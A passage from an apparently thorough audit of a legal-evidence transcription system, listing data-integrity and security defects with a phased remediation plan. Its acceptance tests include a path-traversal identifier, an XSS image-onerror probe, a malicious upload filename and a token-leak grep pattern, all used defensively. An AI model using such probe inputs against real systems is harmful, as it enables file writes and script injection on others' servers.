The evidence corpus is 29 transcripts / 3,582 segments / ~5 hours of audio — **655 lines of Python per transcript**. A single module, `qdrant_law_index.py` (**3,288 lines, 17% of the codebase**), carries ten unrelated responsibilities: Markdown parsing, bilingual tag classification, the `doc_type` taxonomy, the `LawArticle` entity, payload-edit validation, corpus planning/dedup, two ingest paths, search, parity reporting, and registry-artifact writing (a **290-line single function**). The largest investment is the law-corpus/Qdrant apparatus; the least mature area is evidentiary integrity. That inversion is the strategic problem.

---

## 5. Defect register (consolidated, by severity)

Abbreviated; each item was reproduced or read directly. **C** = critical, **H** = high, **M** = medium, **L** = low.

### Critical
| # | Finding | Evidence |
|---|---|---|
| C1 | Canonical store round-trip destroys `segment_datetime` + segment `speaker_id`; **349 timestamps already lost** | `json_store.py:23-36`, `transcript.py:14-27`; `.bak` vs live |
| C2 | Auto-refiner merges `SPEAKER_00`/`SPEAKER_01` into one speaker, no human gate | `transcript_auditor.py:231-245`, `validate_and_refine_transcript.py:270-277`; reproduced |
| C3 | Reconciliation window can empty a transcript and report success | `validate_and_refine_transcript.py:408`; reproduced (`segments: []`) |
| C4 | Diarization normaliser silently deletes short speech | `transcribe_audio.py:111-123`; reproduced (17.1 s lost) |
| C5 | Zero authentication on 93 endpoints + 4 static mounts of privileged data | no `Depends`/security scheme anywhere in `src/` |
| C6 | Unauthenticated SSRF + server-side API-key exfiltration via `base_url` | `llm/router.py:432-433`, `providers.py:276-277`; loopback probe |
| C7 | Path-traversal **write** via `transcript_id` on `/import` | `json_store.py:22`, `transcripts.py:308`; `TestClient` proof |
| C8 | MCP tools read/copy/symlink arbitrary paths outside every allow-list | `meta_server.py:463-479`, `:294-318`, `:558-591`, `:594-635`; reproduced |
| C9 | Review UI text/speaker/time corrections silently discarded with a success response | `transcripts.py:1150-1166` vs `pinocchio.html:6607-6639` |

### High
Stored XSS in `pinocchio.html:3650-3655` (+`-en` twin) · arbitrary-extension upload → stored XSS in a public mount (`audio_file_adapter.py:43-49` + `main.py:102`) · free-form `collection` in the law API (`law_registry.py:308` → `qdrant_law_index.py:2511`) · `.env.example` missing, compose cannot start · `docker compose up` runs the RunPod worker (no HTTP) · `run.sh` committed merge conflict · `.dockerignore` bakes 2.9 GB of venvs · `start.sh` sources a file from another repository and reports false success · MCP example configs point at a venv that cannot import `mcp` · RunPod start command cannot import · `run_ingest_all3.sh` cds out of the repository · `torch.load` monkeypatched process-wide · `min_speakers`/`max_speakers` silently ignored by pyannote · canonical law writer never emits `source_path` → provenance gate permanently fails · `only_missing` + `multi_language` silently skips missing locales · README's "all file paths validated" is false for CSV import, reference link, project docs · `make typecheck` checks nothing · `make lint` 210 errors · 4 failing tests · `transcript_fields.py` dead schema with 5 divergent serializers · `segment_datetime` contradicts `recording_datetime` in **all** 1,807 values · the violation registry does not exist (28 of 35 codes unresolvable) · `fix_violations_cited.py` cannot run · `fix_vocabularies.py` aborts on real `I-001` data · `smoke_test_mcp.py` never collected · a "unit" test connects to production Qdrant · privileged material + PII tracked in git · stale `law_registry.v2.json` fails its own schema and gates · `MCP_READINESS_REPORT` numbers false.
Also: `apply_patches=False` is not a dry run (`validate_and_refine_transcript.py:212-241`) · LLM output written into frozen entities unvalidated (`guided_transcribe.py:171,190-199`) · prompt injection reaches persisted artifacts (`guided_transcribe.py:161-169`) · `canonical_name` path traversal on `/refine` (`guided_transcribe.py:189`) · character-proportion text splitting corrupts words (`guided_transcribe.py:311-323`) · `chilean_spanish.py` ordering bug + over-broad replacements corrupt text (`"si po"` → `"sí poh'"`) · `bool("false") is True` in the validator.

### Medium / Low (representative)
Non-atomic registry and report writes · `wait=False` on canonical payload writes counted as success · merge-only writes make drift unfixable · two `SentenceTransformer` instances · whole-collection scrolls into RAM · unbounded job/progress state · attacker-controlled unevicted segment-audio cache · SSE can hang forever · 200-with-error responses · internal `str(e)` leakage in ~15 endpoints · `events_written` describes a store nothing reads · `stop.sh` can kill unrelated processes (`.dev-logs` is shared by 6 sibling projects) · `config.py` `load_dotenv(override=True)` mutates `os.environ` · hardcoded `/home/leandrodisconzi/...` fallbacks (`transcripts.py:93,175,945,957`) · `--dry-run` still writes docs · `fix_speaker_ids.py` report generation clobbers hand-written prose · `tests/unit/test_path_validator.py` leaks env vars · `voiceprint.py` never mounted while its docstring claims it replaces the stub · `/api/transcripts/audio/list` discloses absolute paths · `json_store.py:170-175` `replace(".json","")` mangles names.

---

## 6. Root-cause analysis

The defects are not random. Six systemic causes explain almost all of them.

1. **No enforced contract between the enrichment layer and the store.** `segment_datetime`/`speaker_id` were added to the JSON by scripts, but never to the `Segment` entity — and the declared schema module that would have caught the mismatch is dead code. *One* import of `validate_transcript` into the store's `save`/`load` would have prevented §4.1 entirely.
2. **Quality gates that fail open.** `make typecheck` aborts silently, `ruff` was never driven to zero, the schema module is unused, and `.github/` being gitignored makes CI structurally impossible. Nothing in the workflow can stop a regression — which is why 4 tests are red and nobody noticed.
3. **"Success" is not tied to observed state.** `applied` vs `skipped`, `events_written` counting unwritten edits, `wait=False` writes counted as updated, empty-transcript refinements returning 200 — the same anti-pattern recurs. The system reports intent rather than outcome.
4. **Untrusted input is only sometimes treated as untrusted.** The audio path is validated; the CSV path, reference link, project docs, `canonical_name`, `collection`, and `base_url` are not. Validation was added where a specific bug was reported, not at a boundary.
5. **Heuristics tuned without reference to the data they run on.** A distance-2 string metric applied to `SPEAKER_nn` labels; an average-based minimum-duration filter applied to turn merging; a language fallback guessing `pt`. Each is a plausible-looking default that inverts on the actual corpus.
6. **Documentation written ahead of the code, then never reconciled.** Verified production numbers in docstrings, "0 of 27", "43 keys", "ready, 0 missing", "no destructive operations" — all correct when written, all wrong now, none machine-checked. 535 KB of stale reports then hides which doc is current.

---

## 7. Is the project worth continuing?

**Yes — with a deliberate narrowing.** The case-specific knowledge embedded here (Chilean-Spanish normalisation, the law crosswalk, the narrative/stage model, speaker resolution across 29 recordings, the reference-guided diffing concept) is expensive to recreate and does not exist off the shelf. The architecture can carry it.

But the current allocation of effort is wrong. The project has invested heavily in *breadth* (41 MCP tools, 93 endpoints, 5 UIs, three Qdrant collections, two LLM stacks) and lightly in *soundness* (no auth, no chain of custody, no schema enforcement, no CI). For an evidentiary product, soundness **is** the feature.

---

## 8. Improvement proposal

Organised as four phases. Phase 0 is emergency; Phase 1 makes the record trustworthy; Phase 2 makes the system operable; Phase 3 makes it maintainable. Each item has a concrete action and an acceptance criterion.

### Phase 0 — Stop the bleeding (do first, ~1–2 days)

| # | Action | Acceptance |
|---|---|---|
| 0.1 | **Recover the destroyed timestamps.** Copy `data/transcripts/bak/*.bak` to a safe location *before any cleanup*, then restore `segment_datetime` on the 4 affected files. | `grep -c segment_datetime data/transcripts/I-002_07*.json` → 211; `I-002_12` → 134 |
| 0.2 | **Rotate every credential in `.env`** (HF, PyANNOTE, RunPod, DeepSeek, Qdrant). They are not in git, but they are on disk, are reachable through §4.7, and truncated prefixes are printed in tracked `AUDIT_REPORT.md:714-715`. Then scrub those two lines. | Fresh tokens; `git grep -nE 'hf_[A-Za-z0-9]{6}|rpa_[A-Za-z0-9]{6}'` → empty |
| 0.3 | **Remove `base_url` from `ChatRequest`** (the UI never sends it). If any client needs it, allowlist scheme+host per provider and never attach credentials off-allowlist. | `grep -n base_url src/llm/router.py` → only `_chat_url(provider, None)` paths; probe against a loopback socket shows no `Authorization` on a foreign host |
| 0.4 | **Validate `transcript_id`** with a strict allowlist + realpath containment in `json_store.save`/`load`. | `TestClient` `transcript_id="./../../x"` → 422/400, no file written outside `TRANSCRIPT_DIR` |
| 0.5 | **Add authentication** (a single bearer/API-key dependency on all routers, plus auth in front of the static mounts) and default-bind to `127.0.0.1`. | `curl` without a token → 401 on every route including `/transcripts/*`, `/audio/*` |
| 0.6 | **Drop the global `torch.load` patch**; keep `weights_only=True` and extend `add_safe_globals`, then load the pyannote/Whisper models to confirm. | `grep -n "weights_only" src/infrastructure/model_manager.py` → no global monkeypatch; a real diarization run still works |
| 0.7 | **Fix the two XSS sinks** (`escapeHtml(text)` in `pinocchio.html` + `-en`) **and** whitelist upload extensions / force server-side names. | A `<img onerror>` segment renders as text; `filename=evil.html` → 400 |
| 0.8 | **Restore the quality gates.** Add `src/__init__.py`; point Makefile targets at `$(PYTHON)`; fix the 4 red tests (2 stale MCP contracts, 1 stale corpus test, and the fourth); get ruff to 0. | `make test` green; `make lint` clean; `make typecheck` reports real errors (then drive to 0) |
| 0.9 | **Remove `.github/` from `.gitignore`** and add a CI workflow running test + lint + mypy + a corpus-schema validation. | CI runs on push and fails on a red test |

### Phase 1 — Make the record trustworthy (~2–3 weeks)

This is the phase that turns the product from "a transcription tool" into "an evidentiary system".

| # | Action | Acceptance |
|---|---|---|
| 1.1 | **Make `transcript_fields.py` the enforced schema.** Add `segment_datetime`/`speaker_id` to `SEGMENT_FIELDS`; add `participants` to `_NESTED_SCHEMAS` and declare `segment_labels`; declare a closed value set for `violations_cited`. Wire `validate_transcript` into the store's `save` (`strict=True`, raise) and `load` (log + quarantine), the import routes, and a new `GET /api/transcripts/{id}/validate`. | `validate_transcript()` on all 29 real files reports **0 errors and 0 warnings**; a round-trip of every real file is byte-stable for declared fields |
| 1.2 | **Collapse the five segment serializers into one `segment_to_dict()`** in the domain layer; add a round-trip regression test over a real `data/transcripts/*.json` sample. | Only one serializer exists; the test fails if any declared field is dropped |
| 1.3 | **Fix the auditor/refiner correctness defects.** Exclude ordinal label families (`SPEAKER_\d+`) from drift detection and gate relabels on human approval; make the reconciliation window atomic (validate all inserts before applying any delete, roll back the window on any skip); never drop turns in the normaliser — coalesce them and record what was merged; compare speakers before emitting `MID_WORD_BOUNDARY`. | Reproductions for §4.2/4.3/4.4 now produce *zero* silent changes; each gets a regression test |
| 1.4 | **Make failure visible.** `apply()` must return only confirmed patches; routes must surface `skipped` and return 207/422 when nothing was applied; `apply_patches=False` must be a true dry run; persist `edited_texts`/`edited_speakers`/`edited_starts`/`edited_ends`/`recording_datetime` or reject them; delete `_event_store` or persist it append-only. | An edit round-trips through `/review/save` and survives a reload; a no-op refinement cannot return 200 |
| 1.5 | **Chain of custody.** Record `sha256` of every source audio file in `metadata`; compute a content digest per transcript revision; write `corrections_applied` entries with actor/model/timestamp/`before`/`after`; add an append-only revision log rather than whole-file overwrite. | A transcript's provenance is reconstructible from the JSON alone; a changed byte is detectable |
| 1.6 | **Resolve the two-wall-clock conflict** and decide authoritative time. Recompute `segment_datetime := recording_datetime + start` (verified exact for the recoverable files), or document and enforce whichever clock is authoritative. | Zero disagreements between `segment_datetime` and `recording_datetime + start` |
| 1.7 | **Normalise speaker labels on segments, not just participants.** Extend `fix_speaker_ids.py` to canonicalise `segments[].speaker` (or add a `segment_label` → `speaker_id` resolution step) and fix the 10 offending label formats. | A schema enum on `segments[].speaker`; the registry's `unmapped_segment_instances` count → **0** (currently 424) |
| 1.8 | **Repair the corpus geometry.** Renumber the two 1-based files to 0-based; sort segments chronologically; resolve the 705 overlaps (or document them explicitly as diarization artifacts); collapse the 47 adjacent duplicate-text pairs. | No out-of-order segments; `index == position` in every file; overlap count reported and bounded |
| 1.9 | **Make the citation layer real.** Vendor the violation registry into the repo (or declare its path in `config.py`), enforce the code space with a closed `FieldSpec` value set, and add a CI check that every cited code resolves. Fix or retire `fix_violations_cited.py`. | 35/35 codes resolve; a citation to an unknown code fails validation |
| 1.10 | **Decide the law-registry's status.** Either regenerate with `--validate-schema`, resolve the 17 duplicate ELIs (deduplicate per-article files against parent-law files), and write `source_path` on the canonical path so the provenance gate can pass — **or** delete the artifact until its consumers migrate. Surface gate state in `/api/law/status` and the UI. | `overall: "pass"` with 0 collisions, 0 missing/extra, 1119/1119 provenance; the UI displays gate state |
| 1.11 | **Fix `language_for_path`.** Add `INT` to the locale map (or classify by content), raise on unknown locale directories instead of guessing `pt`, and support `"multi"` for genuinely bilingual files. Re-derive the `pt`/`es`/`en` breakdown. | Each `INT/*.md` → `en`; `language_breakdown` matches an independent count; bilingual files labelled `multi` |

### Phase 2 — Make it operable (~1–2 weeks)

| # | Action | Acceptance |
|---|---|---|
| 2.1 | **Add `.env.example`** (names + placeholders), point compose at `.env`, and add `command: uvicorn src.main:app --host 0.0.0.0 --port 8000` so `docker compose up` actually serves HTTP. | `docker compose config` succeeds; `docker compose up` then `GET /health` works |
| 2.2 | **Fix `run.sh`** (delete the merge conflict or the file), fix `run_ingest_all3.sh`'s `cd`, and fix the RunPod start command to `-m src.runpod_handler` in both the script and the docs. | `bash -n` on every tracked shell script passes (add it to CI) |
| 2.3 | **Make `start.sh` self-contained** (inline the logging helpers it needs) and make it fail loudly when the API health check times out. | From a fresh clone, `./start.sh` either succeeds or exits non-zero with the last 20 log lines |
| 2.4 | **Fix the container build.** Add `.venv/`, `.venv-py312/`, `.venv-mcp/`, `.DS_Store`, `.logs/`, `.run/`, `.pytest_cache/`, `.ruff_cache/`, `data/segment_audio/`, `data/speakers/`, `data/speaker_index.json` to `.dockerignore`; split `requirements.txt` into runtime and dev; declare `requests`. | Build context < 100 MB; the image contains no pytest/ruff |
| 2.5 | **Constrain the law `collection` parameter** to `Literal["canonical","local"]` mapped server-side; require `confirm` for any canonical or destructive CLI flag. | Passing `collection="reviewed_transcripts"` → 422 |
| 2.6 | **Bound the resource paths.** Cap job/progress state with eviction; make the segment-audio cache LRU-bounded and clamp `start`/`end`; fix SSE to read terminal state from `_jobs` so it returns instead of hanging; add a cancellation endpoint; retain task references; offload the guided pipeline to threads; take the law job lock around check-then-act. | A post-completion SSE connect returns immediately; a cancelled job stops; no unbounded growth under a job-flood test |
| 2.7 | **Retire the ghost endpoints.** Mount or delete `voiceprint.py`; resolve the `/` route collision so `/` serves the UI (or fix the README); stop returning internal `str(e)`; return 400/422 rather than 500 for user errors. | `/` serves the Pinocchio UI; no exception text in any HTTP response |

### Phase 3 — Make it maintainable (~3–4 weeks, can run partly in parallel)

| # | Action | Acceptance |
|---|---|---|
| 3.1 | **Split `qdrant_law_index.py` (3,288 lines) into five modules** — `law_corpus.py`, `law_payload_edit.py`, `law_ingest.py`, `law_search.py`, `law_registry_artifacts.py` — plus a shared `qdrant_common.py` that also kills the three duplicated URL/key normalisers. Behaviour-preserving; the 114 existing law tests are the safety net. | No file in `src/` exceeds ~600 lines; the law test suite stays green |
| 3.2 | **Split `transcripts.py` (1,546 lines)** into `_jobs.py` (progress/SSE), `_matching.py` (the 110-line fuzzy filename scorer), and the handler module, and `law_registry.py` into `_jobs.py` / `_suggest.py`. | Same |
| 3.3 | **Replace the five `init_*_router` globals with FastAPI `Depends`** over the existing `composition.py` runtime; rename `transcriptionRuntime` → `TranscriptionRuntime`; expose one lazily-cached `get_runtime()` so a normal run builds one `ModelManager` instead of four. | No module-level mutable router state; one runtime per process |
| 3.4 | **Raise test coverage where the bugs were**, with a target rather than a number: router-level adversarial tests for `save_review`, CSV import, reference link, project docs, the law `collection` parameter, and the law API; concurrency tests for job state; and the round-trip tests from 1.1/1.2. Add `pytest-cov` and report the number in CI. | Every Phase 0/1 item has a regression test; coverage reported and non-decreasing |
| 3.5 | **De-duplicate the templates.** `pinocchio-en.html` differs from `pinocchio.html` on only ~1,076 of ~7,000 lines, and `revision-en` on ~838 of ~3,100 — so every bug exists twice (as §4.8 shows). Move to Jinja2 with a translation dictionary, or at minimum extract shared partials and one escaping helper. | One template per view; the escaper is shared |
| 3.6 | **Make the repair scripts safe by construction.** Every in-place corpus writer must take a timestamped backup (extend `_headerlib.save_docs`), honour `--dry-run`, and write generated tables into owned fenced regions instead of clobbering hand-written prose. Delete the orphaned one-offs (`fix_indices_stg29.py`, `run_ingest_all3.sh`) or move them under `scripts/` with a `--path` argument. | A dry run leaves the tree byte-identical (`git status` clean) |
| 3.7 | **Consolidate the documentation.** Delete or move the 535 KB of stale reports to `docs/archive/`; rewrite `AUDIT_REPORT.md`/`agent_transcription.md` or remove them; fix the 18 "27 transcripts" references; regenerate `SPEAKER_ID_CONSOLIDATION.md` and `VIOLATIONS_CROSSWALK.md` from the data; and **generate** the README's endpoint table from the OpenAPI schema so it cannot drift. | One current architecture doc; the endpoint table is generated in CI |
| 3.8 | **Resolve the `data/` policy explicitly.** Decide what is source-of-truth (the `.md` law corpus: yes) versus generated (transcripts, speakers, indexes: no). **Recover the `bak/`-only timestamps first (0.1), then** `git rm --cached` the generated trees, extend `.gitignore`, and delete the 7 duplicate law PDFs and the unused PDF directory entirely (the parser reads only `*.md`). If privileged material must remain under version control, move it to an encrypted/private store with access control. | `git ls-files data/` contains only intentional source data; no duplicate PDFs; no privileged transcripts in git |
| 3.9 | **Reconcile the "declared vs actual" gap permanently:** the bilingual tag alias table and its docstring numbers (0 occurrences in the corpus), `MCP_READINESS_REPORT.md` (regenerate in CI and fail on drift), and the pod/config defaults (port 8888 vs 8049, Python 3.13 accepted vs `<3.13` declared, `.venv` vs `.venv-py312`, pyright pointed at the 3.14 venv). | Regenerated artifacts match live discovery; no contradictory defaults |

### Sequencing rationale

- **0.1 before 3.8** — the backup files are the only copy of 349 timestamps; deleting tracked data first would make the loss permanent. This ordering is the single most important detail in this proposal.
- **0.3/0.4/0.5 before anything else security-adjacent** — the SSRF exfiltrates a live credential, and there is no auth at all.
- **1.1 before 3.1** — get the schema enforced while the code is still in one file; the split is then verifiable against a real contract.
- **3.4 grows with 1.x, not after it** — each correctness fix should land with its regression test.

---

## 9. Answers to the questions asked

**What is the project for?** Producing and curating an evidentiary record — diarized, attributed, law-cited transcripts — for a specific Chilean aviation-incident legal matter, with the same audio transcribed repeatedly and versions reconciled against human corrections and narrative accounts.

**What is it good at?** Architecture and layering (real dependency inversion, clean ports); the parts of persistence that matter (atomic writes, deterministic point IDs, vector-preserving law writes); Chilean-Spanish specialisation; the reference-guided diffing *concept*; and documentation of the law-corpus domain. It also handles genuinely hard domain modelling — stage ordering, speaker identity across recordings, bilingual law citation — that is not available off the shelf.

**What is it bad at?** (1) Evidentiary soundness — it has already lost data, it silently discards human corrections, and it can merge distinct speakers or empty a transcript while reporting success. (2) Security — 93 endpoints with no authentication, a verified secret-exfiltration path, and several traversal/arbitrary-read holes. (3) Verified claims — the quality gates, the schema module, the citation registry and the law-registry artifact all *report* correctness they do not enforce or possess. (4) Accuracy of its own documentation and configuration. (5) Proportionality: 19k lines and 41 MCP tools for 5 hours of audio, with the effort concentrated in the vector-index apparatus rather than in the evidence chain.

**The one-line version:** the bones are good and the domain knowledge is valuable, but the system currently *asserts* integrity rather than enforcing it — and in three verified cases it has already destroyed or discarded the very evidence it exists to protect.

---

## 10. Method & confidence

**How this was produced.** Five parallel expert reviews covered (1) domain + application, (2) infrastructure adapters, (3) presentation + UI, (4) MCP + composition + deployment, (5) tests + data model + data integrity — each reading its scope in full and required to attach `file:line` plus a verbatim quote to every claim. Those results were then independently re-verified by direct execution where the claim was load-bearing.

**Reproduced first-hand rather than taken on report:**

- the full test suite (`4 failed, 499 passed`) and the failure texts
- `ruff` (210 errors, with a per-rule breakdown) and `mypy` (abort, then 144 errors with `--explicit-package-bases`)
- the `SPEAKER_00`/`SPEAKER_01` drift classification and its `SPEAKER_LABEL_DRIFT` anomaly
- the 349 destroyed `segment_datetime` values, by `.bak` vs live comparison
- the `language_for_path` bug, by calling the function on real corpus paths
- all corpus statistics (overlaps, ordering, `index` bases, labels, orthography, duplicates, languages)
- the law-registry gates, the 8 schema violations, and the citation-resolution gap
- the missing `.env.example`, the compose/RunPod command contradictions, the committed merge conflict in `run.sh`, the `.dockerignore` gap, the undeclared `requests` dependency, `make typecheck`'s abort, and `transcript_fields.py`'s zero importers
- git hygiene: `.env` never committed, `.github/` ignored, 510 tracked files, tracked privileged material and PII

**Confidence.** High on every `file:line` claim and every measured count, since those are reproducible with the commands shipped in this review's history. Two caveats: (a) `docker compose config` could not be run (no compose plugin available), so the compose failures are inferred from the verified-missing `env_file` target and the image `CMD`, though both are unambiguous; and (b) no model-loading transcription run was attempted (it would require GPU/resource-heavy model loads), so ML-runtime behaviour — pyannote's `min_speakers` handling apart, which was checked against the installed package source — is assessed from code and package introspection rather than from an end-to-end run.

**No workspace changes were made by this review.** The working tree contains only the two modifications that pre-existed it (`start.sh`, `data/speaker_index.json`). A single root-level scratch report produced during the review was folded into this document and removed, so that this review does not itself add to the documentation sprawl it identifies in §4.16.
